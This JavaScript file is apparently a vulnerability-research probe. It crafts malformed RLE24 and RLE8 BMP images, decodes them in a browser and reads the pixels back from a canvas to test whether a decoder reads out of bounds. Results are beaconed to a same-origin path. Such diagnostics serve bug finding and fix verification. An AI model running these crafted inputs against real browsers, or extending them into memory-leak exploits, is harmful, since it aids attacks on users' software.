// p403 - BMP RLE24 readCurrentPixel offset diagnostic
//
// Determines EXACTLY where readCurrentPixel reads by using sequential
// byte values in the absolute data, then comparing canvas pixel values.
//
// If readCurrentPixel uses m_coord.x() * 3 (OOB bug present):
//   Pixel at x=DX reads from byte offset DX*3 in file from m_decodedOffset
//   Since absolute data is only CNT*3 bytes, DX*3 reads PAST it
//
// If readCurrentPixel uses (m_coord.x() - startX) * 3 (fixed):
//   Pixel at x=DX reads from byte offset 0 in absolute data
//
// Diagnostic: fill absolute data with bytes 0,1,2,3,...
// Canvas readback tells us the offset.
//
// Beacon prefix: V403-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V403-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Test 1: RLE24 with DX=100, CNT=156
  // If OOB: reads at 100*3=300 from m_decodedOffset, past 468B of data -> within file still
  // If fixed: reads at 0 from m_decodedOffset
  try {
    var W = 256, H = 2, DX = 100;
    var CNT = W - DX; // 156
    var HDR = 14 + 40; // no palette for 24bpp

    var rle = [];
    // Row 0: fill with encoded black
    rle.push(255, 0, 0, 0);
    rle.push(1, 0, 0, 0);
    rle.push(0, 0); // EOL

    // Row 1: delta then absolute
    rle.push(0, 2, DX, 0); // delta X=100
    rle.push(0, CNT); // absolute mode, 156 pixels

    // Fill absolute data with sequential bytes 0,1,2,...
    // 156 * 3 = 468 bytes
    for (var i = 0; i < CNT * 3; i++) {
      rle.push(i & 0xFF);
    }
    // No padding needed (468 is even)
    rle.push(0, 0); // EOL
    rle.push(0, 1); // EOB

    var fSize = HDR + rle.length;
    var absDataStart = HDR + 10 + 4 + 2; // after row0(10) + delta(4) + absHeader(2) = 70

    B('T1-FSIZ-' + fSize + '-ABS-' + absDataStart + '-ABSLEN-' + (CNT*3));

    var bmp = new Uint8Array(fSize);
    var p = 0;
    // File header
    bmp[p++] = 0x42; bmp[p++] = 0x4D;
    bmp[p++] = fSize & 0xFF; bmp[p++] = (fSize >> 8) & 0xFF;
    bmp[p++] = (fSize >> 16) & 0xFF; bmp[p++] = (fSize >> 24) & 0xFF;
    p += 4;
    bmp[p++] = HDR & 0xFF; bmp[p++] = (HDR >> 8) & 0xFF;
    bmp[p++] = (HDR >> 16) & 0xFF; bmp[p++] = (HDR >> 24) & 0xFF;
    // Info header
    bmp[p++] = 40; p += 3;
    bmp[p++] = W & 0xFF; bmp[p++] = (W >> 8) & 0xFF; p += 2;
    bmp[p++] = H & 0xFF; bmp[p++] = (H >> 8) & 0xFF; p += 2;
    bmp[p++] = 1; bmp[p++] = 0; // planes
    bmp[p++] = 24; bmp[p++] = 0; // 24bpp
    bmp[p++] = 4; p += 3; // biCompression=4 (RLE24)
    p += 20; // rest zeros
    // RLE data
    for (var i = 0; i < rle.length; i++) bmp[p++] = rle[i];

    var blob = new Blob([bmp], { type: 'image/bmp' });
    var url = URL.createObjectURL(blob);
    var img = new Image();

    img.onload = function() {
      B('T1-LOADED-' + img.width + 'x' + img.height);

      var canvas = document.createElement('canvas');
      canvas.width = W; canvas.height = H;
      var ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0);

      // Read top row (canvas y=0 = file row 1)
      var d = ctx.getImageData(0, 0, W, 1).data;

      // Report first pixel at x=DX
      var r0 = d[DX*4], g0 = d[DX*4+1], b0 = d[DX*4+2];
      // If fixed: R=byte[2]=2, G=byte[1]=1, B=byte[0]=0
      //   (24bpp BMP stores BGR; getComponent extracts via masks)
      // If OOB with offset 300: R=byte[302], G=byte[301], B=byte[300]
      //   = R=(302%256)=46, G=(301%256)=45, B=(300%256)=44
      B('T1-PX0-R' + r0 + '-G' + g0 + '-B' + b0);

      // Report first 12 pixels (36 bytes) as hex
      var hex = '';
      for (var x = DX; x < DX + 12 && x < W; x++) {
        hex += hx(d[x*4]) + hx(d[x*4+1]) + hx(d[x*4+2]);
      }
      B('T1-HEX12-' + hex);

      // Report pixel at x=DX+50 and x=DX+100 for offset verification
      var px50 = DX + 50;
      if (px50 < W) {
        B('T1-PX50-R' + d[px50*4] + '-G' + d[px50*4+1] + '-B' + d[px50*4+2]);
      }
      var px100 = DX + 100;
      if (px100 < W) {
        B('T1-PX100-R' + d[px100*4] + '-G' + d[px100*4+1] + '-B' + d[px100*4+2]);
      }

      // Check pre-delta pixels (should be black/transparent)
      var preDeltaNz = 0;
      for (var x = 0; x < DX; x++) {
        if (d[x*4] || d[x*4+1] || d[x*4+2]) preDeltaNz++;
      }
      B('T1-PRE-NZ-' + preDeltaNz);

      // Determine the read offset
      // Pixel at x reads 3 bytes starting at some offset from m_decodedOffset
      // If byte sequence at pixel x is [B, G, R] from file:
      //   offset = B (since file byte at position 0 is 0, position 1 is 1, etc.)
      // The byte value equals its position in the absolute data
      // So for pixel x: byte offset = B value from canvas
      // (Because in 24bpp BMP, file byte 0 = Blue channel of first pixel)
      var firstB = d[DX*4 + 2]; // Blue channel = first file byte for this pixel
      B('T1-READOFFSET-' + firstB);
      // If 0: reading from start of absolute data (fixed behavior)
      // If 300: reading from offset 300 = DX*3 (OOB bug)

      setTimeout(runTest2, 200);
    };

    img.onerror = function() {
      B('T1-ERR');
      // Fallback: try uncompressed 24bpp to verify canvas works
      setTimeout(runTest3, 200);
    };

    img.src = url;

  } catch(e) {
    B('T1-EX-' + e.message.substring(0, 60));
  }

  // Test 2: RLE8 with same delta for comparison
  // RLE8 uses sequential byte indexing -- should always read correct data
  function runTest2() {
    try {
      var W2 = 256, H2 = 2, DX2 = 100;
      var CNT2 = W2 - DX2;
      var PAL2 = 256 * 4;
      var HDR2 = 14 + 40 + PAL2;

      var rle2 = [];
      // Row 0: fill with index 0
      rle2.push(255, 0);
      rle2.push(1, 0);
      rle2.push(0, 0); // EOL

      // Row 1: delta then absolute
      rle2.push(0, 2, DX2, 0);
      // For absolute mode in RLE8, count must be >= 3
      var rem2 = CNT2;
      while (rem2 > 0) {
        var chunk = rem2 > 255 ? 255 : rem2;
        if (chunk >= 3) {
          rle2.push(0, chunk);
          for (var i = 0; i < chunk; i++) rle2.push(i & 0xFF);
          if (chunk % 2 !== 0) rle2.push(0); // pad
        } else {
          rle2.push(chunk, 0); // encoded
        }
        rem2 -= chunk;
      }
      rle2.push(0, 0); // EOL
      rle2.push(0, 1); // EOB

      var fSize2 = HDR2 + rle2.length;
      var bmp2 = new Uint8Array(fSize2);
      var q = 0;
      bmp2[q++] = 0x42; bmp2[q++] = 0x4D;
      bmp2[q++] = fSize2 & 0xFF; bmp2[q++] = (fSize2 >> 8) & 0xFF;
      bmp2[q++] = (fSize2 >> 16) & 0xFF; bmp2[q++] = (fSize2 >> 24) & 0xFF;
      q += 4;
      bmp2[q++] = HDR2 & 0xFF; bmp2[q++] = (HDR2 >> 8) & 0xFF;
      bmp2[q++] = (HDR2 >> 16) & 0xFF; bmp2[q++] = (HDR2 >> 24) & 0xFF;
      bmp2[q++] = 40; q += 3;
      bmp2[q++] = W2 & 0xFF; bmp2[q++] = (W2 >> 8) & 0xFF; q += 2;
      bmp2[q++] = H2 & 0xFF; bmp2[q++] = (H2 >> 8) & 0xFF; q += 2;
      bmp2[q++] = 1; bmp2[q++] = 0;
      bmp2[q++] = 8; bmp2[q++] = 0; // 8bpp
      bmp2[q++] = 1; q += 3; // BI_RLE8
      q += 4; // sizeImage
      q += 8; // pels
      bmp2[q++] = 0; bmp2[q++] = 1; q += 2; // 256 colors
      q += 4;
      // Identity palette
      for (var i = 0; i < 256; i++) {
        bmp2[q++] = i; bmp2[q++] = 0; bmp2[q++] = i; bmp2[q++] = 0;
      }
      for (var i = 0; i < rle2.length; i++) bmp2[q++] = rle2[i];

      var blob2 = new Blob([bmp2], { type: 'image/bmp' });
      var url2 = URL.createObjectURL(blob2);
      var img2 = new Image();
      img2.onload = function() {
        B('T2-LOADED');
        var c2 = document.createElement('canvas');
        c2.width = W2; c2.height = H2;
        var cx2 = c2.getContext('2d');
        cx2.drawImage(img2, 0, 0);
        var d2 = cx2.getImageData(0, 0, W2, 1).data;
        // First pixel after delta: should be palette[0] = (R=0, G=0, B=0)
        B('T2-PX0-R' + d2[DX2*4] + '-G' + d2[DX2*4+1] + '-B' + d2[DX2*4+2]);
        // Pixel 10 after delta: palette[10] = (R=10, G=0, B=10)
        var px10 = DX2 + 10;
        B('T2-PX10-R' + d2[px10*4] + '-G' + d2[px10*4+1] + '-B' + d2[px10*4+2]);
        runTest3();
      };
      img2.onerror = function() { B('T2-ERR'); runTest3(); };
      img2.src = url2;
    } catch(e) {
      B('T2-EX-' + e.message.substring(0, 60));
      runTest3();
    }
  }

  // Test 3: Non-RLE 24bpp diagnostic (verify canvas channel order)
  function runTest3() {
    try {
      var W3 = 8, H3 = 1;
      var HDR3 = 14 + 40;
      var rowBytes = W3 * 3;
      var padRow = (rowBytes + 3) & ~3;
      var fSize3 = HDR3 + padRow * H3;
      var bmp3 = new Uint8Array(fSize3);
      var q = 0;
      bmp3[q++] = 0x42; bmp3[q++] = 0x4D;
      bmp3[q++] = fSize3 & 0xFF; bmp3[q++] = (fSize3 >> 8) & 0xFF;
      bmp3[q++] = (fSize3 >> 16) & 0xFF; bmp3[q++] = (fSize3 >> 24) & 0xFF;
      q += 4;
      bmp3[q++] = HDR3 & 0xFF; bmp3[q++] = (HDR3 >> 8) & 0xFF;
      bmp3[q++] = (HDR3 >> 16) & 0xFF; bmp3[q++] = (HDR3 >> 24) & 0xFF;
      bmp3[q++] = 40; q += 3;
      bmp3[q++] = W3; q += 3;
      bmp3[q++] = H3; q += 3;
      bmp3[q++] = 1; bmp3[q++] = 0;
      bmp3[q++] = 24; bmp3[q++] = 0;
      q += 24; // biCompression=0 (BI_RGB)
      // Pixel data: BGR format
      // Pixel 0: B=0x11, G=0x22, R=0x33
      bmp3[q++] = 0x11; bmp3[q++] = 0x22; bmp3[q++] = 0x33;
      // Pixel 1: B=0x44, G=0x55, R=0x66
      bmp3[q++] = 0x44; bmp3[q++] = 0x55; bmp3[q++] = 0x66;
      // Pixel 2: B=0xFF, G=0x00, R=0x00
      bmp3[q++] = 0xFF; bmp3[q++] = 0x00; bmp3[q++] = 0x00;
      // Pixel 3: B=0x00, G=0xFF, R=0x00
      bmp3[q++] = 0x00; bmp3[q++] = 0xFF; bmp3[q++] = 0x00;
      // Remaining pixels: 0
      // Pad row to 4-byte boundary
      while (q < fSize3) bmp3[q++] = 0;

      var blob3 = new Blob([bmp3], { type: 'image/bmp' });
      var url3 = URL.createObjectURL(blob3);
      var img3 = new Image();
      img3.onload = function() {
        var c3 = document.createElement('canvas');
        c3.width = W3; c3.height = H3;
        var cx3 = c3.getContext('2d');
        cx3.drawImage(img3, 0, 0);
        var d3 = cx3.getImageData(0, 0, W3, 1).data;
        // Pixel 0: canvas should be R=0x33, G=0x22, B=0x11
        B('T3-PX0-R' + d3[0] + '-G' + d3[1] + '-B' + d3[2] + '-A' + d3[3]);
        // Pixel 1: canvas R=0x66, G=0x55, B=0x44
        B('T3-PX1-R' + d3[4] + '-G' + d3[5] + '-B' + d3[6]);
        B('COMPLETE');
      };
      img3.onerror = function() { B('T3-ERR'); B('COMPLETE'); };
      img3.src = url3;
    } catch(e) {
      B('T3-EX-' + e.message.substring(0, 60));
      B('COMPLETE');
    }
  }

})();
